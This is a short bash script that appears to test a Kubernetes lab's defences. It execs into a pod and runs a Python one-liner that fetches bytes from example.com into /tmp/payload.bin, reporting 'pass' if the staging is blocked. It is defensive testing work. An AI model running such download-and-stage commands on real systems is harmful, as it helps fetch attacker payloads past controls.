#!/usr/bin/env bash
set -euo pipefail

KUBECONFIG_PATH="$1"
NS="${MODELARMOR_NAMESPACE:-modelarmor-lab}"
POD="$(kubectl --kubeconfig "$KUBECONFIG_PATH" -n "$NS" get pod -l app=modelarmor-demo -o jsonpath='{.items[0].metadata.name}')"

set +e
kubectl --kubeconfig "$KUBECONFIG_PATH" -n "$NS" exec "$POD" -- python3 -c 'import urllib.request; data=urllib.request.urlopen("http://example.com", timeout=5).read(32); open("/tmp/payload.bin","wb").write(data); print(len(data))' \
  >/tmp/modelarmor-stage.stdout 2>/tmp/modelarmor-stage.stderr
rc=$?
set -e

if [[ $rc -eq 0 ]]; then
  jq -n --arg stdout "$(cat /tmp/modelarmor-stage.stdout 2>/dev/null || true)" '{status:"degraded",summary:"ModelArmor-style lab allowed payload staging to /tmp",details:{stdout:$stdout}}'
else
  jq -n --arg stderr "$(cat /tmp/modelarmor-stage.stderr 2>/dev/null || true)" '{status:"pass",summary:"ModelArmor-style lab blocked payload staging chain",details:{stderr:$stderr}}'
fi
